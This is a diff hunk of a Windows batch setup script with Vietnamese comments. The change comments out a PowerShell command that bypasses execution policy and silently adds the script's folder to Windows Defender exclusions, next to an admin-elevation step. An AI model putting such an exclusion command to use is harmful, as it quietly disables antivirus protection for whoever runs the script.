@@ -10,7 +10,7 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 :: --- PHAN 2: CAU HINH MOI TRUONG ---
 echo Dang khoi tao moi truong...
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
+rem powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
 
 
 :: 1. Tao thu muc C:\Windows\Soft
